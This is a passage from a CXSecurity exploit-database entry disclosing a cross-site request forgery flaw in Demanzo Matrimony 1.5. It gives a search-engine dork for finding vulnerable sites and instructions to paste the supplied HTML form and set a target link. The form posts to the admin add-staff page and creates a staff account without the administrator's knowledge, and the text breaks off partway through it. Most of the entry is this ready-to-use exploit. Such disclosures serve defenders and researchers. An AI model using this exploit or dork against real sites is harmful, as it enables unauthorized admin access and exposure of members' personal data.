---
title: Demanzo Matrimony 1.5 Cross Site Request Forgery
url: https://cxsecurity.com/issue/WLB-2023020032
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-20
fetch_date: 2025-10-04T07:31:45.717455
---

# Demanzo Matrimony 1.5 Cross Site Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Demanzo Matrimony 1.5 Cross Site Request Forgery** **2023.02.19**  Credit:  **[indoushka](https://cxsecurity.com/author/indoushka/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")** | |

====================================================================================================================================
| # Title : Demanzo Matrimony v.1.5 CSRF Vulnerability |
| # Author : indoushka |
| # Tested on : windows 10 Français V.(Pro) / browser : Mozilla firefox 109.0.1(32-bit) |
| # Vendor : https://demanzo.com/matrimony-site-development/ |
| # Dork : Powered by ITAcumens or "Powered by Demanzo" |
====================================================================================================================================
poc :
[+] infected file: add-staff.php
[+] Inside folder /admin/add-staff.php
[+] Dorking İn Google Or Other Search Enggine.
[+] Copy the code below and paste it into an HTML file.
[+] Go to the line 2.
[+] Set the target site link Save changes and apply .
</div>
<form action="https://www.example/web/html/admin/add-staff.php" method="POST">
<div id="msg">
<div class="form-group ban\_btm1 col-md-6 no\_pad">
<label class="control-label col-md-4 frm\_pd">Name <span class="red">\*</span> : </label>
<div class="col-md-8 frm\_pd">
<input required="" name="name" id="name" value="" type="text" class="form-control" placeholder="Enter Name">
</div>
</div>
<div class="form-group ban\_btm1 col-md-6 no\_pad">
<label class="control-label col-md-4 frm\_pd">Password <span class="red">\*</span> : </label>
<div class="col-md-8 frm\_pd">
<input required="" name="pass" id="pass" value="" type="password" class="form-control" placeholder="Enter Password">
</div>
</div>
<div class="form-group ban\_btm1 col-md-6 no\_pad">
<label class="control-label col-md-4 frm\_pd">Email ID <span class="red">\*</span> : </label>
<div class="col-md-8 frm\_pd">
<input required="" name="email" id="email" value="" type="email" class="form-control" placeholder="Enter Email ID">
</div>
</div>
<div class="form-group ban\_btm1 col-md-6 no\_pad">
<label class="control-label col-md-4 frm\_pd">Gender <span class="red">\*</span> : </label>
<div class="col-md-8 frm\_pd">
<input type="radio" name="gender" value="Male" checked=""><label class="rd\_btn">Male</label>
<input type="radio" name="gender" value="Female"><label class="rd\_btn">Female</label>
</div>
</div>
<div class="form-group ban\_btm1 col-md-12 no\_pad">
<label class="control-label frm\_pd col-md-2">Designation <span class="red">\*</span> : </label>
<div class="col-md-10 frm\_pd">
<input required="" name="designation" value="" id="designation" type="text" class="form-control" placeholder="Enter Designation">
</div>
</div>
<div class="form-group ban\_btm1 col-md-12 no\_pad">
<label class="control-label col-md-2 frm\_pd">Address <span class="red">\*</span> : </label>
<div class="col-md-10 frm\_pd">
<textarea required="" name="address" id="address" rows="7" class="form-control" placeholder="Enter Address"></textarea>
</div>
</div>
<!-- <div class="form-group ban\_btm1 col-md-12 no\_pad"> -->
<!-- <label class="control-label col-md-2 frm\_pd">Access Level <span class="red">\*</span> : </label> -->
<!-- <div class="col-md-10 frm\_pd chk\_box"> -->
<!-- <input id="access1" type="checkbox" checked /> <label for="access1" class="col-lg-3 col-md-5 col-sm-6">All</label> -->
<!-- <input id="access2" type="checkbox" /> <label for="access2" class="col-lg-4 col-md-7 col-sm-6">Manage Plan</label> -->
<!-- <input id="access3" type="checkbox" /> <label for="access3" class="col-lg-5 col-md-5 col-sm-6">Manage Kootam / Kulam</label> -->
<!-- <input id="access4" type="checkbox" /> <label for="access4" class="col-lg-3 col-md-7 col-sm-6">To Approve</label> -->
<!-- <input id="access5" type="checkbox" /> <label for="access5" class="col-lg-4 col-md-5 col-sm-6">Manage Success Stories</label> -->
<!-- <input id="access6" type="checkbox" /> <label for="access6" class="col-lg-5 col-md-7 col-sm-6">Manage Advertisement</label> -->
<!-- <input id="access7" type="checkbox" /> <label for="access7" class="col-lg-3 col-md-5 col-sm-6">Manage Staff</label> -->
<!-- <input id="access8" type="checkbox" /> <label for="access8" class="col-lg-4 col-md-7 col-sm-6">Manage Member</label> -->
<!-- <input id="access9" type="checkbox" /> <label for="access9" class="col-lg-5 col-md-5 col-sm-6">Manage City</label> -->
<!-- <input id="access10" type="checkbox" /> <label for="access10" class="col-lg-3 col-md-7 col-sm-6">Manage State</label> -->
<!-- <input id="access11" type="checkbox" /> <label for="access11" class="col-lg-4 col-md-5 col-sm-6">Manage Country</label> -->
<!-- <input id="access12" type="checkbox" /> <label for="access12" class="col-lg-5 col-md-7 col-sm-6">Manage Education</label> -->
<!-- <input id="access13" type="checkbox" /> <label for="access13" class="col-lg-3 col-md-5 col-sm-6">Reports</label> -->
<!-- <input id="access14" type="checkbox" /> <label for="access14" class="col-lg-4 col-md-7 col-sm-6">Ematch</label> -->
<!-- <input id="access15" type="checkbox" /> <label for="access15" class="col-lg-5 col-md-5 col-sm-6">Advanced Search</label> -->
<!-- <input id="access16" type="checkbox" /> <label for="access16" class="col-lg-3 col-md-7 col-sm-6">Group Mail</label> -->
<!-- <input id="access17" type="checkbox" /> <label for="access17" class="col-lg-4 col-md-5 col-sm-6">Featured Profiles</label> -->
<!-- <input id="access18" type="checkbox" /> <label for="access18" class="col-lg-5 col-md-7 col-sm-6">Upgrade / Renewal Membership</label> -->
<!-- <input id="access19" type="checkbox" /> <label for="access19" class="col-lg-3 col-md-5 col-sm-6">Accounts </label> -->
<!-- <input id="access20" type="checkbox" /> <label for="access20" class="col-lg-4 col-md-7 col-sm-6">Logo</label> -->
<!-- <input id="access21" type="checkbox" /> <label for="access21" class="col-lg-5 col-md-5 col-sm-6">Religion</label> -->
<!-- </div> -->
<!-- </div> -->
<!-- <div class="form-group ban\_btm1 col-lg-7...